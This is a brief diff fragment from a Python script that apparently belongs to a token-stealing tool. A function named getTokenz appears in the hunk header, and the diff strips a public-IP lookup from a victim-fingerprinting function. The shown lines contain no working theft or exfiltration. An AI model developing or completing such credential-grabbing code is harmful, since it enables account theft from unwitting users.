@@ -66,7 +66,8 @@ def getTokenz(path):
 def whoTheFuckAmI():
     ip = "None"
     try:
-        ip = json.loads(requests.get("https://api.ipify.org?format=json").text)
+        ip = "Can't Access"
+        return ip
     except:
         ip = "Can't Access"
         return ip
